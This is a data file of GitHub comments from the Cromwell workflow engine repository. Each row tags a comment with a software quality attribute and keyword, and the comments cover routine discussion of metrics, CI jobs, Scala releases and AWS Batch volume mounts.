https://github.com/broadinstitute/cromwell/pull/6318#issuecomment-828598501:484,Availability,down,down,484,"@cjllanwarne Would it make sense to send a `0L` metric for `workflowArchiveTotalTimeFailureMetricPath` in [Success cases here](https://github.com/broadinstitute/cromwell/blob/80cfe3e4b653c5ab6f2f935c9b306b34cd4287c9/services/src/main/scala/cromwell/services/metadata/impl/archiver/ArchiveMetadataSchedulerActor.scala#L77-L99) so that the graph line can come back to 0 upon a success in the below graph? Currently after a failure metric, it stays at the x seconds and never comes back down. ![Screen Shot 2021-04-28 at 12 28 15 PM](https://user-images.githubusercontent.com/16748522/116439527-a757d000-a81d-11eb-8b2e-1d4238aab769.png)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6318#issuecomment-828598501
https://github.com/broadinstitute/cromwell/pull/6319#issuecomment-825204463:67,Availability,failure,failures,67,Going with changing Martha to try-and-silence accessUrl generation failures.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6319#issuecomment-825204463
https://github.com/broadinstitute/cromwell/pull/6319#issuecomment-825204463:46,Security,access,accessUrl,46,Going with changing Martha to try-and-silence accessUrl generation failures.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6319#issuecomment-825204463
https://github.com/broadinstitute/cromwell/pull/6321#issuecomment-825606134:160,Deployability,integrat,integration,160,"No need to wait on the [dsp-jenkins PR](https://github.com/broadinstitute/dsp-jenkins/pull/524), that's just the Groovy code that can be used to regenerate the integration test jobs on fc jenkins. I manually generated those jobs on fc jenkins yesterday. This does need to wait on a newly documented flaky test though grumble grumble BT-241",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6321#issuecomment-825606134
https://github.com/broadinstitute/cromwell/pull/6321#issuecomment-825606134:160,Integrability,integrat,integration,160,"No need to wait on the [dsp-jenkins PR](https://github.com/broadinstitute/dsp-jenkins/pull/524), that's just the Groovy code that can be used to regenerate the integration test jobs on fc jenkins. I manually generated those jobs on fc jenkins yesterday. This does need to wait on a newly documented flaky test though grumble grumble BT-241",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6321#issuecomment-825606134
https://github.com/broadinstitute/cromwell/pull/6321#issuecomment-825606134:172,Testability,test,test,172,"No need to wait on the [dsp-jenkins PR](https://github.com/broadinstitute/dsp-jenkins/pull/524), that's just the Groovy code that can be used to regenerate the integration test jobs on fc jenkins. I manually generated those jobs on fc jenkins yesterday. This does need to wait on a newly documented flaky test though grumble grumble BT-241",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6321#issuecomment-825606134
https://github.com/broadinstitute/cromwell/pull/6321#issuecomment-825606134:305,Testability,test,test,305,"No need to wait on the [dsp-jenkins PR](https://github.com/broadinstitute/dsp-jenkins/pull/524), that's just the Groovy code that can be used to regenerate the integration test jobs on fc jenkins. I manually generated those jobs on fc jenkins yesterday. This does need to wait on a newly documented flaky test though grumble grumble BT-241",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6321#issuecomment-825606134
https://github.com/broadinstitute/cromwell/pull/6322#issuecomment-827832262:364,Availability,avail,available,364,"- Removed `prsalt.txt`.; - Added an sbt run configuration for `renderCiResources` and set the 'Cromwell server' configuration to invoke it before launching the server.; - The ""JDK of 'cromwell' module"" seemed like the least problematic choice of JDK; specifying particular patch levels and builds of JDK 11 seemed like it might not work out well as updates become available...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6322#issuecomment-827832262
https://github.com/broadinstitute/cromwell/pull/6322#issuecomment-827832262:44,Deployability,configurat,configuration,44,"- Removed `prsalt.txt`.; - Added an sbt run configuration for `renderCiResources` and set the 'Cromwell server' configuration to invoke it before launching the server.; - The ""JDK of 'cromwell' module"" seemed like the least problematic choice of JDK; specifying particular patch levels and builds of JDK 11 seemed like it might not work out well as updates become available...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6322#issuecomment-827832262
https://github.com/broadinstitute/cromwell/pull/6322#issuecomment-827832262:112,Deployability,configurat,configuration,112,"- Removed `prsalt.txt`.; - Added an sbt run configuration for `renderCiResources` and set the 'Cromwell server' configuration to invoke it before launching the server.; - The ""JDK of 'cromwell' module"" seemed like the least problematic choice of JDK; specifying particular patch levels and builds of JDK 11 seemed like it might not work out well as updates become available...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6322#issuecomment-827832262
https://github.com/broadinstitute/cromwell/pull/6322#issuecomment-827832262:273,Deployability,patch,patch,273,"- Removed `prsalt.txt`.; - Added an sbt run configuration for `renderCiResources` and set the 'Cromwell server' configuration to invoke it before launching the server.; - The ""JDK of 'cromwell' module"" seemed like the least problematic choice of JDK; specifying particular patch levels and builds of JDK 11 seemed like it might not work out well as updates become available...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6322#issuecomment-827832262
https://github.com/broadinstitute/cromwell/pull/6322#issuecomment-827832262:349,Deployability,update,updates,349,"- Removed `prsalt.txt`.; - Added an sbt run configuration for `renderCiResources` and set the 'Cromwell server' configuration to invoke it before launching the server.; - The ""JDK of 'cromwell' module"" seemed like the least problematic choice of JDK; specifying particular patch levels and builds of JDK 11 seemed like it might not work out well as updates become available...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6322#issuecomment-827832262
https://github.com/broadinstitute/cromwell/pull/6322#issuecomment-827832262:44,Modifiability,config,configuration,44,"- Removed `prsalt.txt`.; - Added an sbt run configuration for `renderCiResources` and set the 'Cromwell server' configuration to invoke it before launching the server.; - The ""JDK of 'cromwell' module"" seemed like the least problematic choice of JDK; specifying particular patch levels and builds of JDK 11 seemed like it might not work out well as updates become available...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6322#issuecomment-827832262
https://github.com/broadinstitute/cromwell/pull/6322#issuecomment-827832262:112,Modifiability,config,configuration,112,"- Removed `prsalt.txt`.; - Added an sbt run configuration for `renderCiResources` and set the 'Cromwell server' configuration to invoke it before launching the server.; - The ""JDK of 'cromwell' module"" seemed like the least problematic choice of JDK; specifying particular patch levels and builds of JDK 11 seemed like it might not work out well as updates become available...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6322#issuecomment-827832262
https://github.com/broadinstitute/cromwell/pull/6328#issuecomment-868994698:313,Deployability,release,released,313,"Merge conflicts come with the territory of ""not in sprint"" weekend PRs 😅. RE: CROM-6777- As this PR mentions, the `nowarn` issues are a bug fixed by [scala/scala-collection-compat#426](https://dereferer.me/?https%3A//github.com/scala/scala-collection-compat/issues/426). But as of 2021-06-26 the fix [hasn't been released yet](https://github.com/scala/scala-collection-compat/releases). Whether the amelioration in this PR gets merged will depend on if upgrading scala/sbt appears on BT's priority backlog first, or if `@SethTisue` drops a new release of `scala-collection-compat` before then. For now, in this branch the test command `sbt centaurCwlRunner/assembly` with `2.12.14` Works For Me™.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6328#issuecomment-868994698
https://github.com/broadinstitute/cromwell/pull/6328#issuecomment-868994698:376,Deployability,release,releases,376,"Merge conflicts come with the territory of ""not in sprint"" weekend PRs 😅. RE: CROM-6777- As this PR mentions, the `nowarn` issues are a bug fixed by [scala/scala-collection-compat#426](https://dereferer.me/?https%3A//github.com/scala/scala-collection-compat/issues/426). But as of 2021-06-26 the fix [hasn't been released yet](https://github.com/scala/scala-collection-compat/releases). Whether the amelioration in this PR gets merged will depend on if upgrading scala/sbt appears on BT's priority backlog first, or if `@SethTisue` drops a new release of `scala-collection-compat` before then. For now, in this branch the test command `sbt centaurCwlRunner/assembly` with `2.12.14` Works For Me™.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6328#issuecomment-868994698
https://github.com/broadinstitute/cromwell/pull/6328#issuecomment-868994698:544,Deployability,release,release,544,"Merge conflicts come with the territory of ""not in sprint"" weekend PRs 😅. RE: CROM-6777- As this PR mentions, the `nowarn` issues are a bug fixed by [scala/scala-collection-compat#426](https://dereferer.me/?https%3A//github.com/scala/scala-collection-compat/issues/426). But as of 2021-06-26 the fix [hasn't been released yet](https://github.com/scala/scala-collection-compat/releases). Whether the amelioration in this PR gets merged will depend on if upgrading scala/sbt appears on BT's priority backlog first, or if `@SethTisue` drops a new release of `scala-collection-compat` before then. For now, in this branch the test command `sbt centaurCwlRunner/assembly` with `2.12.14` Works For Me™.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6328#issuecomment-868994698
https://github.com/broadinstitute/cromwell/pull/6328#issuecomment-868994698:440,Integrability,depend,depend,440,"Merge conflicts come with the territory of ""not in sprint"" weekend PRs 😅. RE: CROM-6777- As this PR mentions, the `nowarn` issues are a bug fixed by [scala/scala-collection-compat#426](https://dereferer.me/?https%3A//github.com/scala/scala-collection-compat/issues/426). But as of 2021-06-26 the fix [hasn't been released yet](https://github.com/scala/scala-collection-compat/releases). Whether the amelioration in this PR gets merged will depend on if upgrading scala/sbt appears on BT's priority backlog first, or if `@SethTisue` drops a new release of `scala-collection-compat` before then. For now, in this branch the test command `sbt centaurCwlRunner/assembly` with `2.12.14` Works For Me™.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6328#issuecomment-868994698
https://github.com/broadinstitute/cromwell/pull/6328#issuecomment-868994698:622,Testability,test,test,622,"Merge conflicts come with the territory of ""not in sprint"" weekend PRs 😅. RE: CROM-6777- As this PR mentions, the `nowarn` issues are a bug fixed by [scala/scala-collection-compat#426](https://dereferer.me/?https%3A//github.com/scala/scala-collection-compat/issues/426). But as of 2021-06-26 the fix [hasn't been released yet](https://github.com/scala/scala-collection-compat/releases). Whether the amelioration in this PR gets merged will depend on if upgrading scala/sbt appears on BT's priority backlog first, or if `@SethTisue` drops a new release of `scala-collection-compat` before then. For now, in this branch the test command `sbt centaurCwlRunner/assembly` with `2.12.14` Works For Me™.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6328#issuecomment-868994698
https://github.com/broadinstitute/cromwell/pull/6328#issuecomment-869833225:29,Deployability,release,release,29,Will be much neater if a new release is published (requested at https://github.com/scala/scala-collection-compat/issues/466),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6328#issuecomment-869833225
https://github.com/broadinstitute/cromwell/pull/6331#issuecomment-832961406:67,Security,audit,audit,67,I wanted to make minimal changes. This started as a vault rotation/audit ticket. But I definitely see the annoyance in having it partially removed.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6331#issuecomment-832961406
https://github.com/broadinstitute/cromwell/pull/6332#issuecomment-859740349:1199,Modifiability,enhance,enhancement,1199,"> Just curious, was the possibility of checking regionality within the Cromwell server rather than on the VM considered? This might not work in all cases if the target zones for the VM is broad, but in community Terra the default list of `zones` are all within one region. It's an interesting idea. Cromwell can act as the user's pet service account, so it would be able to check bucket locations with the same permissions as the solution here, running on the VM. It's true that the default list of zones on Terra is all in one region, but users can set their own zones, and this PR is partly intended to help catch when people have WDLs/inputs that set the zones list to all of the US zones (for example). This PR is intended to be a failsafe that generalizes (as it happens at the time everything is knowable). This PR is also intended to be a stopgap until there can be a more sophisticated on-submission or pre-submission check. With regards to the list of zones, Cromwell submits this to the PAPI and any of these can be chosen. It would be an interesting idea to try to narrow the user's submitted list and pick the ""best"" zone(s) based on the input locations. That would be a nice additional enhancement in the future.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6332#issuecomment-859740349
https://github.com/broadinstitute/cromwell/issues/6334#issuecomment-919302484:494,Availability,avail,available,494,"Hi Jon,. This isn't directly supported right now. You could change the; CloudFormation template so that your customized mount is mounted to the EC2; nodes. It is also possible to mount EFS directly into an AWS Batch; container through the job definition but that would require changes in; Cromwell's AWS Batch backend. Using EFS with containers for Cromwell; workflows is something we are investigating but there are some stress tests; that we need to do at scale to see if sufficient IOPs are available. On Wed, May 5, 2021 at 11:29 AM microbioticajon ***@***.***>; wrote:. > Hi Guys,; >; > This is more of a question/request than a bug report. Apologies if this is; > not the place to ask.; >; > Im trying to run Cromwell with an AWS backend. A number of our workflows; > make extensive use of very large reference files. To avoid localising the; > same huge file over and over (wasting time and space) I want to copy these; > reference files to an additional volume during batch node initialisation; > and mount to each container (rather than using File arguments I would use a; > simple String argument to prevent localisation - I appreciate this is a; > hack). I am already doing this with a different pipeline framework with; > some success, however it requires the JobDefinition to specify the mount; > locations between the node(host) and job container; >; > Is it possible to provide additional mount/volume instructions to the aws; > batch backend in the cromwell.conf?; >; > If this is possible, I cannot see any specific examples in the Cromwell; > docs. If this is not currently possible, could I request adding the ability; > to define additional mount points as a feature request??; >; > Kind Regards,; > Jon; >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/6334>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EI7XBOPHMWSYW3",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6334#issuecomment-919302484
https://github.com/broadinstitute/cromwell/issues/6334#issuecomment-919302484:1207,Deployability,pipeline,pipeline,1207,"ted right now. You could change the; CloudFormation template so that your customized mount is mounted to the EC2; nodes. It is also possible to mount EFS directly into an AWS Batch; container through the job definition but that would require changes in; Cromwell's AWS Batch backend. Using EFS with containers for Cromwell; workflows is something we are investigating but there are some stress tests; that we need to do at scale to see if sufficient IOPs are available. On Wed, May 5, 2021 at 11:29 AM microbioticajon ***@***.***>; wrote:. > Hi Guys,; >; > This is more of a question/request than a bug report. Apologies if this is; > not the place to ask.; >; > Im trying to run Cromwell with an AWS backend. A number of our workflows; > make extensive use of very large reference files. To avoid localising the; > same huge file over and over (wasting time and space) I want to copy these; > reference files to an additional volume during batch node initialisation; > and mount to each container (rather than using File arguments I would use a; > simple String argument to prevent localisation - I appreciate this is a; > hack). I am already doing this with a different pipeline framework with; > some success, however it requires the JobDefinition to specify the mount; > locations between the node(host) and job container; >; > Is it possible to provide additional mount/volume instructions to the aws; > batch backend in the cromwell.conf?; >; > If this is possible, I cannot see any specific examples in the Cromwell; > docs. If this is not currently possible, could I request adding the ability; > to define additional mount points as a feature request??; >; > Kind Regards,; > Jon; >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/6334>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EI7XBOPHMWSYW3EDFTTMFP7HANCNFSM44FGDSRQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6334#issuecomment-919302484
https://github.com/broadinstitute/cromwell/issues/6334#issuecomment-919302484:827,Safety,avoid,avoid,827,"Hi Jon,. This isn't directly supported right now. You could change the; CloudFormation template so that your customized mount is mounted to the EC2; nodes. It is also possible to mount EFS directly into an AWS Batch; container through the job definition but that would require changes in; Cromwell's AWS Batch backend. Using EFS with containers for Cromwell; workflows is something we are investigating but there are some stress tests; that we need to do at scale to see if sufficient IOPs are available. On Wed, May 5, 2021 at 11:29 AM microbioticajon ***@***.***>; wrote:. > Hi Guys,; >; > This is more of a question/request than a bug report. Apologies if this is; > not the place to ask.; >; > Im trying to run Cromwell with an AWS backend. A number of our workflows; > make extensive use of very large reference files. To avoid localising the; > same huge file over and over (wasting time and space) I want to copy these; > reference files to an additional volume during batch node initialisation; > and mount to each container (rather than using File arguments I would use a; > simple String argument to prevent localisation - I appreciate this is a; > hack). I am already doing this with a different pipeline framework with; > some success, however it requires the JobDefinition to specify the mount; > locations between the node(host) and job container; >; > Is it possible to provide additional mount/volume instructions to the aws; > batch backend in the cromwell.conf?; >; > If this is possible, I cannot see any specific examples in the Cromwell; > docs. If this is not currently possible, could I request adding the ability; > to define additional mount points as a feature request??; >; > Kind Regards,; > Jon; >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/6334>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EI7XBOPHMWSYW3",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6334#issuecomment-919302484
https://github.com/broadinstitute/cromwell/issues/6334#issuecomment-919302484:429,Testability,test,tests,429,"Hi Jon,. This isn't directly supported right now. You could change the; CloudFormation template so that your customized mount is mounted to the EC2; nodes. It is also possible to mount EFS directly into an AWS Batch; container through the job definition but that would require changes in; Cromwell's AWS Batch backend. Using EFS with containers for Cromwell; workflows is something we are investigating but there are some stress tests; that we need to do at scale to see if sufficient IOPs are available. On Wed, May 5, 2021 at 11:29 AM microbioticajon ***@***.***>; wrote:. > Hi Guys,; >; > This is more of a question/request than a bug report. Apologies if this is; > not the place to ask.; >; > Im trying to run Cromwell with an AWS backend. A number of our workflows; > make extensive use of very large reference files. To avoid localising the; > same huge file over and over (wasting time and space) I want to copy these; > reference files to an additional volume during batch node initialisation; > and mount to each container (rather than using File arguments I would use a; > simple String argument to prevent localisation - I appreciate this is a; > hack). I am already doing this with a different pipeline framework with; > some success, however it requires the JobDefinition to specify the mount; > locations between the node(host) and job container; >; > Is it possible to provide additional mount/volume instructions to the aws; > batch backend in the cromwell.conf?; >; > If this is possible, I cannot see any specific examples in the Cromwell; > docs. If this is not currently possible, could I request adding the ability; > to define additional mount points as a feature request??; >; > Kind Regards,; > Jon; >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/6334>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EI7XBOPHMWSYW3",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6334#issuecomment-919302484
https://github.com/broadinstitute/cromwell/issues/6334#issuecomment-919302484:1084,Usability,simpl,simple,1084,"Hi Jon,. This isn't directly supported right now. You could change the; CloudFormation template so that your customized mount is mounted to the EC2; nodes. It is also possible to mount EFS directly into an AWS Batch; container through the job definition but that would require changes in; Cromwell's AWS Batch backend. Using EFS with containers for Cromwell; workflows is something we are investigating but there are some stress tests; that we need to do at scale to see if sufficient IOPs are available. On Wed, May 5, 2021 at 11:29 AM microbioticajon ***@***.***>; wrote:. > Hi Guys,; >; > This is more of a question/request than a bug report. Apologies if this is; > not the place to ask.; >; > Im trying to run Cromwell with an AWS backend. A number of our workflows; > make extensive use of very large reference files. To avoid localising the; > same huge file over and over (wasting time and space) I want to copy these; > reference files to an additional volume during batch node initialisation; > and mount to each container (rather than using File arguments I would use a; > simple String argument to prevent localisation - I appreciate this is a; > hack). I am already doing this with a different pipeline framework with; > some success, however it requires the JobDefinition to specify the mount; > locations between the node(host) and job container; >; > Is it possible to provide additional mount/volume instructions to the aws; > batch backend in the cromwell.conf?; >; > If this is possible, I cannot see any specific examples in the Cromwell; > docs. If this is not currently possible, could I request adding the ability; > to define additional mount points as a feature request??; >; > Kind Regards,; > Jon; >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/6334>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EI7XBOPHMWSYW3",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6334#issuecomment-919302484
https://github.com/broadinstitute/cromwell/issues/6334#issuecomment-919472151:1019,Availability,down,downside,1019,"HI @markjschreiber,. Thanks for getting in touch. I had a look at the code and believe I came up with a work around, albeit a bit of a hack. Im building our system in Terraform so have a bit more control over the underlying infrastructure. Im able to mount additional volumes to the underlying ec2 instance, I just needed to mount them inside the container. I managed this with the following runner config:. backend {; default = AWSBatch; providers {; AWSBatch {; actor-factory = ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; config {; ...; default-runtime-attributes {; queueArn: ""${default_batch_queue}""; scriptBucketName: ""${script_bucket}""; disks: ""local-disk,/bin/bash,${static_ref_snapshot_mount}""; zones: ""${aws_batch_availability_zone}""; }; }; }; }. Specifically `default-runtime-attributes.disks`. The first entry in this list always defaults to the working dir (this is the volume I have set up to autoscale), but after that subsequent values correspond to locations on the host. The only downside is that there is no way to change the mount location in the container. Whatever the location on the host has to be the same location in the container. As I control both I can make sure they are in sync. It feels a bit clunky but seems to be working. I will close this issue but would suggest some minor modifications to the AWS volume handling could really add to the systems flexibility /:-). Best,; Jon",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6334#issuecomment-919472151
https://github.com/broadinstitute/cromwell/issues/6334#issuecomment-919472151:399,Modifiability,config,config,399,"HI @markjschreiber,. Thanks for getting in touch. I had a look at the code and believe I came up with a work around, albeit a bit of a hack. Im building our system in Terraform so have a bit more control over the underlying infrastructure. Im able to mount additional volumes to the underlying ec2 instance, I just needed to mount them inside the container. I managed this with the following runner config:. backend {; default = AWSBatch; providers {; AWSBatch {; actor-factory = ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; config {; ...; default-runtime-attributes {; queueArn: ""${default_batch_queue}""; scriptBucketName: ""${script_bucket}""; disks: ""local-disk,/bin/bash,${static_ref_snapshot_mount}""; zones: ""${aws_batch_availability_zone}""; }; }; }; }. Specifically `default-runtime-attributes.disks`. The first entry in this list always defaults to the working dir (this is the volume I have set up to autoscale), but after that subsequent values correspond to locations on the host. The only downside is that there is no way to change the mount location in the container. Whatever the location on the host has to be the same location in the container. As I control both I can make sure they are in sync. It feels a bit clunky but seems to be working. I will close this issue but would suggest some minor modifications to the AWS volume handling could really add to the systems flexibility /:-). Best,; Jon",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6334#issuecomment-919472151
https://github.com/broadinstitute/cromwell/issues/6334#issuecomment-919472151:546,Modifiability,config,config,546,"HI @markjschreiber,. Thanks for getting in touch. I had a look at the code and believe I came up with a work around, albeit a bit of a hack. Im building our system in Terraform so have a bit more control over the underlying infrastructure. Im able to mount additional volumes to the underlying ec2 instance, I just needed to mount them inside the container. I managed this with the following runner config:. backend {; default = AWSBatch; providers {; AWSBatch {; actor-factory = ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; config {; ...; default-runtime-attributes {; queueArn: ""${default_batch_queue}""; scriptBucketName: ""${script_bucket}""; disks: ""local-disk,/bin/bash,${static_ref_snapshot_mount}""; zones: ""${aws_batch_availability_zone}""; }; }; }; }. Specifically `default-runtime-attributes.disks`. The first entry in this list always defaults to the working dir (this is the volume I have set up to autoscale), but after that subsequent values correspond to locations on the host. The only downside is that there is no way to change the mount location in the container. Whatever the location on the host has to be the same location in the container. As I control both I can make sure they are in sync. It feels a bit clunky but seems to be working. I will close this issue but would suggest some minor modifications to the AWS volume handling could really add to the systems flexibility /:-). Best,; Jon",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6334#issuecomment-919472151
https://github.com/broadinstitute/cromwell/issues/6334#issuecomment-919472151:591,Performance,queue,queueArn,591,"HI @markjschreiber,. Thanks for getting in touch. I had a look at the code and believe I came up with a work around, albeit a bit of a hack. Im building our system in Terraform so have a bit more control over the underlying infrastructure. Im able to mount additional volumes to the underlying ec2 instance, I just needed to mount them inside the container. I managed this with the following runner config:. backend {; default = AWSBatch; providers {; AWSBatch {; actor-factory = ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; config {; ...; default-runtime-attributes {; queueArn: ""${default_batch_queue}""; scriptBucketName: ""${script_bucket}""; disks: ""local-disk,/bin/bash,${static_ref_snapshot_mount}""; zones: ""${aws_batch_availability_zone}""; }; }; }; }. Specifically `default-runtime-attributes.disks`. The first entry in this list always defaults to the working dir (this is the volume I have set up to autoscale), but after that subsequent values correspond to locations on the host. The only downside is that there is no way to change the mount location in the container. Whatever the location on the host has to be the same location in the container. As I control both I can make sure they are in sync. It feels a bit clunky but seems to be working. I will close this issue but would suggest some minor modifications to the AWS volume handling could really add to the systems flexibility /:-). Best,; Jon",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6334#issuecomment-919472151
https://github.com/broadinstitute/cromwell/pull/6336#issuecomment-833243214:0,Deployability,Update,Update,0,Update is based on this analysis:. ![workflow_duration_by_status](https://user-images.githubusercontent.com/791985/117333982-7d2e8f80-ae67-11eb-95eb-3cf8f76fa77b.png). See BT-272 for the R script. Edit: Filtered out the workflows that run the individual tests as workflows. Those wrapper workflows were the ones failing (as expected) after ~90 minutes.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6336#issuecomment-833243214
https://github.com/broadinstitute/cromwell/pull/6336#issuecomment-833243214:280,Integrability,wrap,wrapper,280,Update is based on this analysis:. ![workflow_duration_by_status](https://user-images.githubusercontent.com/791985/117333982-7d2e8f80-ae67-11eb-95eb-3cf8f76fa77b.png). See BT-272 for the R script. Edit: Filtered out the workflows that run the individual tests as workflows. Those wrapper workflows were the ones failing (as expected) after ~90 minutes.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6336#issuecomment-833243214
https://github.com/broadinstitute/cromwell/pull/6336#issuecomment-833243214:254,Testability,test,tests,254,Update is based on this analysis:. ![workflow_duration_by_status](https://user-images.githubusercontent.com/791985/117333982-7d2e8f80-ae67-11eb-95eb-3cf8f76fa77b.png). See BT-272 for the R script. Edit: Filtered out the workflows that run the individual tests as workflows. Those wrapper workflows were the ones failing (as expected) after ~90 minutes.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6336#issuecomment-833243214
https://github.com/broadinstitute/cromwell/issues/6337#issuecomment-1201862007:57,Testability,log,logging,57,"AFAIK this isn't a feature yet. I looked into Cromwell's logging system to see if I could come up with a hack, but it's a bit beyond me. See also: https://github.com/broadinstitute/cromwell/issues/3919",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6337#issuecomment-1201862007
https://github.com/broadinstitute/cromwell/issues/6339#issuecomment-2105498534:146,Deployability,configurat,configuration,146,"Hi！; I am glad to see this issue, and I have also tried using PBS as the backend to run it. But I'm not very good at it.; Can you show me how the configuration file for cromwell is defined when using PBS as the backend?; Thank you.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6339#issuecomment-2105498534
https://github.com/broadinstitute/cromwell/issues/6339#issuecomment-2105498534:146,Modifiability,config,configuration,146,"Hi！; I am glad to see this issue, and I have also tried using PBS as the backend to run it. But I'm not very good at it.; Can you show me how the configuration file for cromwell is defined when using PBS as the backend?; Thank you.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6339#issuecomment-2105498534
https://github.com/broadinstitute/cromwell/pull/6347#issuecomment-841343968:215,Performance,optimiz,optimized,215,"> Sounds good, except maybe the per-batch timing should include lookup, even if the per workflow should exclude?. Yeah good point. I noticed on Alpha that the lookup portion was only taking 20 milliseconds with the optimized SQL, so I kind of forgot about it on account of insignificance.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6347#issuecomment-841343968
